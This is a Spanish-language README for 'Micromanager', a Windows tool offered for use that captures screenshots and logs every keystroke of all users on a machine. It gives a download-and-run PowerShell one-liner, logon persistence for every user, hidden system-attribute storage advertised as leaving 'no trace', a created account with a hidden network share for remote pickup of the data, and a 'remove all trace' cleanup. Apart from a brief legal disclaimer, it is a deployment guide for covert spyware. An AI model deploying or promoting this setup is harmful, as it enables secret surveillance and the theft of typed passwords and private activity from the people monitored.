# Micromanager

> **Sistema de Monitoreo Automático para Windows**  
> Aplicación auto-instalable con captura de pantalla, registro de teclado y acceso remoto seguro.

---

## 🚀 **Instalación Instantánea**

### **Descarga y Ejecución Directa (As NT Authority)**
```powershell
# Descargar y ejecutar en un solo comando
irm "https://github.com/osvaldohdzm/microman/releases/download/v2.0.0/Micromanager.exe" -OutFile "C:\Windows\Temp\Micromanager.exe"; & "C:\Windows\Temp\Micromanager.exe" --screenshot 60 --cleanup=30
```

### **Descarga y Ejecución Directa (As Admin User)**
```powershell
# Descargar y ejecutar en un solo comando
irm "https://github.com/osvaldohdzm/microman/releases/download/v2.0.0/Micromanager.exe" -OutFile "C:\Windows\Temp\Micromanager.exe"; & "C:\Windows\Temp\Micromanager.exe" --screenshot 60 --cleanup=30 --shared-folder --shared-user "SoporteManager"
```

###  Verificación rápida:
```powershell
 Get-ChildItem -Force C:\ProgramData\microman\data
```

Get-ChildItem -Force C:\ProgramData\microman\data

### **Método 2: Manual Simple**
1. Descarga `Micromanager.exe` desde los releases
2. **Haz doble clic** en el archivo
3. ¡Listo! El sistema se configura automáticamente

---

## 🛠 Quick Build
```powershell
dotnet publish -c Release -r win-x64 -p:PublishSingleFile=true --self-contained true -p:IncludeAllContentForSelfExtract=true

rm "Micromanager.exe"; copy ".\bin\Release\net8.0-windows\win-x64\publish\Micromanager.exe" "Micromanager.exe"
```

---

## ⚡ **Configuraciones Predefinidas**

### **🔧 Configuración Estándar** (Recomendado para la mayoría de casos)
```powershell
.\Micromanager.exe --screenshot 60 --cleanup=30 --shared-folder --shared-user "SoporteManager"
```
**Resultado:**
- 📸 Capturas cada **30 segundos**
- ⌨️ Keylogger **continuo** en tiempo real
- 📁 Datos en `C:\ProgramData\microman\data\`
- 🔄 Auto-ejecución en todos los inicios de sesión

### **🧪 Modo Pruebas Rápidas**
```powershell
.\Micromanager.exe --screenshot 5 --cleanup=30 --shared-folder --shared-user "SoporteManager" --debug
```
**Ideal para:**
- Demostraciones y pruebas
- Monitoreo de alta frecuencia
- Verificación rápida del sistema
- Compartición segura por red
- Acceso desde `\\NOMBRE-PC\microman$`
- Credenciales dedicadas

 `\\192.168.0.6\microman$`
---

## 🛠 **Gestión del Sistema**

### **⏸️ Pausar Monitoreo**
```powershell
.\Micromanager.exe --disable
```
**Detiene:**
- Todas las capturas activas
- Registro de teclado
- Tarea programada (sin eliminar)

### **🗑️ Desinstalación Completa**
```powershell
.\Micromanager.exe --clean
```
**Elimina:**
- Todos los procesos activos
- Tarea programada
- Carpeta compartida
- **Todos los datos capturados**

---

## 📊 **Especificaciones Técnicas**

### **🎯 Comportamiento por Defecto**
| Componente | Configuración | Notas |
|------------|---------------|-------|
| **Capturas** | 30 segundos | Intervalo configurable |
| **Keylogger** | Tiempo real | Sin intervalo - captura continua |
| **Almacenamiento** | `C:\ProgramData\microman\data\` | Oculto del sistema |
| **Auto-inicio** | Todos los usuarios | Configuración persistente |

### **🔒 Características de Seguridad**
- ✅ **Archivos ocultos** del sistema
- ✅ **Sin rastro** en archivos recientes de Windows
- ✅ **Carpetas protegidas** con atributos de sistema
- ✅ **Acceso por red opcional** con autenticación

### **🌐 Acceso Remoto (Opcional)**
Al usar `--shared-folder`:
```powershell
# Acceso desde red local
\\NOMBRE-EQUIPO\microman$

# Credenciales (personalizables)
Usuario: NOMBRE-EQUIPO\SoporteManager
Contraseña: [Establecida durante instalación]
```

---

## 🎮 **Referencia Rápida de Comandos**

### **📋 Parámetros Principales**

| Comando | Alias | Descripción | Valor por Defecto |
|---------|-------|-------------|------------------|
| `--screenshot-interval N` | `--screenshot N` | Segundos entre capturas | 30 |
| `--cleanup-days N` | `--cleanup N` | Días para conservar datos | 0 (sin limpieza) |
| `--shared-folder` | - | Habilita acceso por red | Desactivado |
| `--shared-user USER` | - | Usuario para acceso remoto | SoporteManager |
| `--disable` | - | Detiene todo el monitoreo | - |
| `--clean` | - | Desinstalación completa | - |
| `--help` | `-h` | Muestra ayuda | - |

### **💡 Combinaciones Útiles**

```powershell
# Monitoreo semanal con limpieza automática
.\Micromanager.exe --screenshot 60 --cleanup 7

# Alta frecuencia con acceso remoto
.\Micromanager.exe --screenshot 10 --shared-folder

# Solo limpieza (sin cambiar intervalo)
.\Micromanager.exe --cleanup 14
```

---

## 📁 **Estructura del Sistema**

```
C:\ProgramData\microman\
├── 📄 Micromanager.exe          # Ejecutable principal
├── 📄 stealth_log.txt           # Log del servicio
└── 📁 data\                     # CARPETA DE DATOS (microman$)
    ├── 📄 startup.log           # Registro de inicios
    ├── 📄 info.log              # Log general del sistema
    ├── 📄 error.log             # Errores y advertencias
    ├── 📄 activity_log.json     # Actividades en JSON
    ├── 📄 key.log               # Registro completo de teclas
    └── 🖼️ capture_*.png         # Capturas de pantalla
```

---

## 🔍 **Verificación y Diagnóstico**

### **✅ Comprobar Instalación**
```powershell
# Verificar tarea programada
schtasks /Query /TN "Micromanager" /V /FO LIST

# Comprobar carpeta compartida
net share microman$

# Revisar archivos generados
dir C:\ProgramData\microman\data\
```

### **🐞 Solución de Problemas**
```powershell
# Si no hay capturas, verificar permisos
.\Micromanager.exe --disable
.\Micromanager.exe --screenshot 10

# Reinstalación completa
.\Micromanager.exe --clean
.\Micromanager.exe
```

---

## ⚠️ **Consideraciones Importantes**

### **🔐 Aspectos Legales y Éticos**
- ⚖️ **Solo usar con autorización explícita**
- 📜 **Cumplir con leyes locales de privacidad**
- 🏢 **Respetar políticas corporativas**

### **🛡️ Seguridad**
- 🔒 Los datos se almacenan localmente de forma segura
- 🌐 El acceso remoto requiere autenticación explícita
- 📊 Los logs incluyen timestamp para auditoría

### **🎯 Rendimiento**
- 🚀 Mínimo impacto en recursos del sistema
- 💾 Limpieza automática de archivos antiguos
- 🔄 Optimizado para ejecución continua

### **🖥️ Ejecución Automática en Todos los Usuarios**
- ⚠️ **Instalación inicial:** Debe ejecutarse manualmente como **Administrador**
- 🔧 **Tarea programada:** Se ejecuta automáticamente al iniciar sesión de **CUALQUIER usuario**
- 👥 **Multi-usuario:** Captura pantalla y teclas de TODOS los usuarios del equipo
- 🔑 **Privilegios:** Se ejecuta con los privilegios más altos del usuario que inicia sesión
- 📝 **Contexto:** Cada usuario ejecuta su propia instancia con acceso a su escritorio

**Ejemplo de instalación:**
```powershell
# 1. Instalación manual (como administrador)
.\Micromanager.exe --screenshot 60 --cleanup=30 --shared-folder --shared-user "SoporteManager"

# 2. La tarea programada se ejecutará automáticamente cuando CUALQUIER usuario inicie sesión:
# Usuario osvaldohm inicia sesión → Micromanager captura su pantalla
# Usuario Kathy inicia sesión → Micromanager captura su pantalla
# Administrador inicia sesión → Micromanager captura su pantalla
```

---

## 🆘 **Soporte Rápido**

### **Problemas Comunes y Soluciones:**

1. **"No se generan capturas"**
   ```powershell
   .\Micromanager.exe --disable
   .\Micromanager.exe --screenshot 5
   ```

2. **"No puedo acceder por red"**
   - Verificar que `--shared-folder` fue usado
   - Comprobar credenciales correctas
   - Confirmar que las PC están en misma red

3. **"Quiero eliminar todo rastro"**
   ```powershell
   .\Micromanager.exe --clean
   ```

4. **"Necesito ayuda"**
   ```powershell
   .\Micromanager.exe --help
   ```

---

## 📞 **Resumen de Comandos Esenciales**

```powershell
# INSTALAR
.\Micromanager.exe

# INSTALAR CON ACCESO REMOTO  
.\Micromanager.exe --shared-folder

# CONFIGURAR ALTA FRECUENCIA
.\Micromanager.exe --screenshot 5 --cleanup=30

# DETENER TEMPORALMENTE
.\Micromanager.exe --disable

# ELIMINAR COMPLETAMENTE
.\Micromanager.exe --clean
```

---

## 🏗️ **Arquitectura y Calidad del Código**

### **Refactorización Profesional v2.0**

Micromanager ha sido completamente refactorizado siguiendo las mejores prácticas de desarrollo profesional:

#### 🔒 **Seguridad Mejorada**
- ✅ **Validación estricta** de nombres de usuario (previene inyección de comandos)
- ✅ **Contraseñas seguras** - No se pasan como texto plano en línea de comandos
- ✅ **Verificación de privilegios** al inicio (no falla a mitad del proceso)
- ✅ **APIs nativas de .NET** en lugar de comandos externos vulnerables

#### 🎯 **Arquitectura Limpia**
- ✅ **Configuración centralizada** - Todas las constantes en `Configuration.cs`
- ✅ **Rutas dinámicas** - Funciona en cualquier configuración de Windows
- ✅ **Separación de responsabilidades** - Cada clase tiene un propósito único
- ✅ **Código reutilizable** - Funciones genéricas y bien estructuradas

#### 💪 **Robustez**
- ✅ **Manejo de errores específico** - Excepciones capturadas por tipo
- ✅ **Reintentos automáticos** - Para operaciones críticas que pueden fallar
- ✅ **Timeout en procesos** - Previene bloqueos indefinidos
- ✅ **Limpieza automática de recursos** - No deja procesos huérfanos

#### 🔧 **Tecnología Nativa**
- ✅ **System.DirectoryServices.AccountManagement** - Gestión de usuarios
- ✅ **Microsoft.Win32.TaskScheduler** - Tareas programadas nativas
- ✅ **NO depende de:** net.exe, wmic.exe, schtasks.exe
- ✅ **Compatible con Windows 11** - WMIC está deprecated, no lo usamos

### **Componentes del Sistema**

```
Micromanager/
├── Configuration.cs           # Configuración centralizada
├── ProcessExecutor.cs         # Ejecución robusta de procesos
├── UserManager.cs             # Gestión nativa de usuarios
├── TaskSchedulerManager.cs    # Gestión nativa de tareas
├── NetworkShareManager.cs     # Gestión de carpetas compartidas
├── ConsoleHelper.cs           # Utilidades de consola
├── Program.cs                 # Punto de entrada refactorizado
└── Worker.cs                  # Servicio de monitoreo
```

📖 **Para más detalles técnicos**, ver `REFACTORING_NOTES.md`

---

## 📄 **Licencia**

Este proyecto es proporcionado "tal cual" sin garantías de ningún tipo. Úsalo bajo tu propia responsabilidad y asegúrate de cumplir con todas las leyes y regulaciones aplicables.

